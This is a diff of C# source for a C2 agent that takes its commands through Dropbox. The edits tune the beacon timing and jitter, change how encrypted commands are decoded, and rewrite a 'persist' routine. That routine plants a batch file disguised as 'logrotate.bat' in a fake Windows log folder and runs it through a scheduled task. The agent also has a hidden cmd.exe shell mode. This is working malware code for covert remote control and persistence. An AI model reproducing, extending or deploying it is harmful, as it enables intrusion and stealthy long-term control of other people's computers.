@@ -15,7 +15,6 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /define:DEBUG /out:dbc2_ag
 */
 
 using System;
-using System.Windows.Forms;
 using System.Threading;
 using System.IO;
 using System.Text;
@@ -26,15 +25,15 @@ using System.Diagnostics;
 namespace dropboxc2
 {
     //****************************************************************************************
-    // Main program
+    // Main class
     //****************************************************************************************
     public class C2_Agent
     {
         //--------------------------------------------------------------------------------------------------
         // Class global variables
         Mutex mutex = null; // Mutex used to ensure there's only one agent running at a time
-        int pollingPeriod = 10000; // Nominal polling period in milliseconds
-        int deviation = 30; // Deviation is a percentage of variation around the polling period
+        int pollingPeriod = 8000; // Nominal polling period in milliseconds
+        int deviation = 20; // Deviation is a percentage of variation around the polling period
         int sleepTime = 0; // Actual sleeping period: a random result based on the pollingPeriod and the deviation
         string agentID = String.Empty;
         string c2StatusFile = String.Empty; // The status file that will be used to notify about the agent status
@@ -73,16 +72,16 @@ namespace dropboxc2
 #endif
                 return;
             }
-            //GC.KeepAlive(mutex);
-            
+                        
             //---------------------------------------------------------------------
 #if (DEBUG)
             Console.WriteLine("------------ AGENT STARTING ------------");
 #endif
             
+            // Retrieve AccessToken and CryptoKey from passed arguments
             string accessToken = args[0];
             byte[] cryptoKey = Convert.FromBase64String(args[1]);
-        
+                   
             // Break flag used to exit the agent
             bool breakFlag = false;
 
@@ -116,23 +115,25 @@ namespace dropboxc2
 #endif
             }
 
+            // Set initial sleep time to the nominal polling period with a deviation
+            c2_agent.sleepTime = c2_agent.getRandomPeriod();
+
             //---------------------------------------------------------------------------------
             // Main loop
             //---------------------------------------------------------------------------------
             while (!breakFlag)
             {
-                // Reset sleep time to the nominal polling period with a deviation
-                c2_agent.sleepTime = c2_agent.getRandomPeriod();
-
 #if (DEBUG)
                 Console.WriteLine("[Main loop] Going to sleep for " + c2_agent.sleepTime / 1000 + " seconds");
 #endif
-
                 // Wait for the polling period to time out
                 Thread.Sleep(c2_agent.sleepTime);
 #if (DEBUG)
                 Console.WriteLine("[Main loop] Waking up");
 #endif
+
+                // Calculate next sleep time
+                c2_agent.sleepTime = c2_agent.getRandomPeriod();
 
                 //----------------------------------------------------------------------------
                 // Check if we're in shellMode
@@ -174,7 +175,7 @@ namespace dropboxc2
                     c2_agent.c2CmdFileLastRevNumber = revNumber;
 
                     // Read the content of the C2 file
-                    string content = Encoding.ASCII.GetString(Crypto.DecryptData(dropboxHandler.readFile(c2_agent.c2CmdFile), cryptoKey));
+                    string content = Encoding.UTF8.GetString(Crypto.DecryptData(dropboxHandler.readFile(c2_agent.c2CmdFile), cryptoKey));
                     if (content == String.Empty)
                     {
 #if (DEBUG)
@@ -334,7 +335,7 @@ namespace dropboxc2
                                 c2_agent.sleepTime = sleepTime * 60 * 1000;
 
 #if (DEBUG)
-                                Console.WriteLine("\t[sleep] Going to sleep for " + sleepTime + " minute(s)");
+                                Console.WriteLine("\t[sleep] Next sleep is: " + sleepTime + " minute(s)");
 #endif
 
                                 // Compute wake up time
@@ -498,12 +499,12 @@ namespace dropboxc2
                             break;
 
                         case "persist":
-                             string oneLiner = strReader.ReadLine();
+                            // Get the current command line through which the stage was started, and 
+                            string oneLiner = Environment.CommandLine;
 #if (DEBUG)
                             Console.WriteLine("\t[persist] Setting agent persistency through scheduled task");
 #endif
-                            // Create a powershell onelone script in the user's profile
-
+                            // Create a fake/misleading batch script in the user's profile
                             string fileDir = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\AppData\Local\WindowsUserLogRotate");
                             Directory.CreateDirectory(fileDir);
                             string filePath = fileDir + @"\logrotate.bat";
@@ -580,7 +581,7 @@ namespace dropboxc2
                     procStartInfo.RedirectStandardOutput = true;
                     procStartInfo.RedirectStandardError = true;
                     procStartInfo.FileName = "cmd.exe";
-                    // procStartInfo.Arguments = "/c powershell.exe"; // Stdinput redirection of Powershell doesn't work on Windows7, so we stick with cmd.exe
+                    //procStartInfo.Arguments = "/c powershell.exe"; // StdInput redirection of Powershell.exe doesn't work on Windows 7
                     procStartInfo.CreateNoWindow = true;
                     procStartInfo.ErrorDialog = false;
 
